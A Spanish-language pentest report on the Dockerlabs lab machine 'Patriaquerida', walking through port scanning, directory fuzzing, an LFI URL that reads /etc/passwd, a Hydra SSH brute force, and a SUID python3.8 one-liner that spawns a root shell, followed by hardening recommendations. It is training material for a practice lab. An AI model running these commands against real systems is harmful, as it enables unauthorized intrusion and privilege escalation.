# 🛡️ Informe de Pentesting – Máquina: Patriaquerida

## 🎯 Objetivo

El objetivo de esta práctica fue realizar un análisis de seguridad sobre la máquina virtual **Patriaquerida**, identificando posibles vulnerabilidades que permitan obtener acceso no autorizado y escalar privilegios hasta el usuario root.

---

## ⚙️ 1. Despliegue de la Máquina

* Se descargó el archivo `Patriaquerida.zip` desde la plataforma Dockerlabs.
* Se descomprimió usando el comando:

  ```bash
  unzip Patriaquerida.zip
  ```
* Se desplegó con el script:

  ```bash
  sudo bash auto_deploy.sh Patriaquerida.zip
  ```

![Inicio](/Patriaquerida/Imagenes/Inicio.jpeg)

---

## 🌐 2. Verificación de Conectividad

* Se confirmó que la máquina estaba activa con un simple *ping*:

  ```bash
  ping -c4 172.17.0.2
  ```

![Ping](/Patriaquerida/Imagenes/Ping.jpeg)

---

## 🔍 3. Escaneo de Puertos

* Se utilizó Nmap para detectar todos los puertos abiertos:

  ```bash
  sudo nmap -p- -oopen -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
  ```

* Resultado: puertos **22 (SSH)** y **80 (HTTP)** abiertos.
  ![Puertos](/Patriaquerida/Imagenes/Puertos.jpeg)

* Luego, se realizó un escaneo más detallado:

  ```bash
  extractPorts allPorts.txt
  nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
  ```

![Servicios](/Patriaquerida/Imagenes/Servicios.jpeg)

---

## 🌐 4. Análisis del Sitio Web

* El sitio web era la página por defecto de Apache.
  ![Pagina](/Patriaquerida/Imagenes/Pagina.jpeg)

---

## 🪓 5. Descubrimiento de Recursos Ocultos

* Se utilizó **Gobuster** para descubrir directorios y archivos ocultos:

  ```bash
  gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 20 -add-slash -b 403,404 -x php,html,txt
  ```
* Se descubrió un archivo `index.php`, que revelaba un archivo oculto: `.hidden_pass`.
  ![Gobuster](/Patriaquerida/Imagenes/Gubuster.jpeg)
  ![PHP](/Patriaquerida/Imagenes/php.jpeg)

---

## 🔑 6. Obtención de Credenciales

* Al acceder a `http://172.17.0.2/.hidden_pass` se encontró la contraseña: `balu`
  ![Contraseña](/Patriaquerida/Imagenes/Contraseña.jpeg)

---

## 🛠️ 7. Escaneo de Vulnerabilidades Web

* Se utilizó **Nikto** para escanear el sitio:

  ```bash
  nikto -h http://172.17.0.2/index.php
  ```
* El escaneo reveló la posibilidad de usar *Local File Inclusion (LFI)*.
  ![Nikto](/Patriaquerida/Imagenes/nikto.jpeg)

---

## 🧠 8. Explotación de LFI

* Se explotó LFI con esta URL:

  ```
  http://172.17.0.2/index.php?page=../../../../etc/passwd
  ```
* Se accedió al archivo `/etc/passwd`, revelando usuarios del sistema:

  * `pinguino`
  * `mario`
  * `root`
    ![Informacion](/Patriaquerida/Imagenes/Informacion.jpeg)

---

## 🔓 9. Ataque de Fuerza Bruta con Hydra

* Se crearon dos archivos:

  * `usuarios.txt` con los nombres encontrados.
  * `contraseña.txt` con la contraseña `balu`.
* Se ejecutó Hydra para probar credenciales vía SSH:

  ```bash
  hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.2 -t 50
  ```
* Credenciales válidas encontradas: `pinguino : balu`
  ![Hydra](/Patriaquerida/Imagenes/Hydra.jpeg)

---

## 🐧 10. Acceso al Sistema

* Se accedió por SSH:

  ```bash
  ssh pinguino@172.17.0.2
  ```

![SSH](/Patriaquerida/Imagenes/SSH.jpeg)

---

## 🚀 11. Escalada de Privilegios

### ¿Qué es escalada de privilegios?

Es el proceso de obtener más privilegios de los que se tienen originalmente. En este caso, se buscaba obtener permisos de **root**.

### Técnica utilizada:

1. Se buscaron binarios con el bit SUID activado:

   ```bash
   find / -perm -4000 2>/dev/null
   ```
2. Se encontró `/usr/bin/python3.8` con SUID.
3. Se usó este comando para ejecutar una shell como root:

   ```python
   python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```
4. ¡Shell de root obtenida!
   ![Escalada](/Patriaquerida/Imagenes/Escalada.jpeg)

---

## ✅ Conclusiones

| Etapa                       | Descripción                                                                          |
| --------------------------- | ------------------------------------------------------------------------------------ |
| **Descubrimiento**          | Fuzzing, LFI y escaneo de puertos revelaron información clave.                       |
| **Credenciales**            | Se halló una contraseña en un archivo oculto y se utilizó para atacar SSH con éxito. |
| **Acceso Inicial**          | Se ingresó como `pinguino` vía SSH.                                                  |
| **Escalada de Privilegios** | Se explotó un binario con permisos SUID (python3.8) para obtener acceso root.        |

---

## 🧩 Recomendaciones

* **Eliminar archivos ocultos** con información sensible (como `.hidden_pass`).
* **Restringir el uso del bit SUID**, especialmente en binarios como Python.
* **Filtrar entradas de usuarios** para evitar LFI.
* **Monitorear intentos de fuerza bruta** en SSH.
* **Usar contraseñas seguras y únicas**.
